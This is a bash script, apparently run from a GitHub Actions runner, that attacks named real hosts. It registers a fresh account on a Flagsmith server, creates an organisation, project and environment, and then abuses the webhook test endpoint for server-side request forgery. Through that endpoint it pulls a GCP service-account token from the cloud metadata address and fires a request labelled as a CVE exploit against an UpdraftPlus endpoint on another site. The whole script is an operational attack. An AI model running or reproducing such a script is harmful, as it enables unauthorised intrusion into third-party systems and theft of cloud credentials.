#!/bin/bash
echo "=== GitHub Actions Runner ==="
echo "IP: $(curl -s https://ifconfig.me)"

# Step 1: Register FRESH account (no prior rate limit on token)
echo "=== REGISTER ==="
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" \
  -d '{"email":"ghactions-kw@proton.me","password":"GhActions2026!","first_name":"GH","last_name":"Runner"}' \
  --max-time 15)
echo "Register: $ACCT"

KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "KEY: $KEY"

if [ -n "$KEY" ]; then
  # Step 2: Create org
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -d '{"name":"gh"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  echo "Org: $OID"
  
  # Step 3: Create project
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -d "{\"name\":\"g\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  echo "Proj: $PID"
  
  # Step 4: Create env
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -d "{\"name\":\"g\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
  echo "Env: $EKEY"
  
  # Step 5: Fire GCP metadata test
  echo "=== GCP METADATA v1beta1 ==="
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -d '{"url":"http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"}' \
    --max-time 20
  echo ""
  
  # Step 6: Fire CVE exploit
  echo "=== CVE-2026-10795 EXPLOIT ==="
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -d '{"url":"https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=test_payload"}' \
    --max-time 20
  echo ""
  
  # Step 7: Test koinp2p.com reachability
  echo "=== KOINP2P REACHABILITY ==="
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -d '{"url":"https://koinp2p.com/"}' \
    --max-time 20
  echo ""
fi
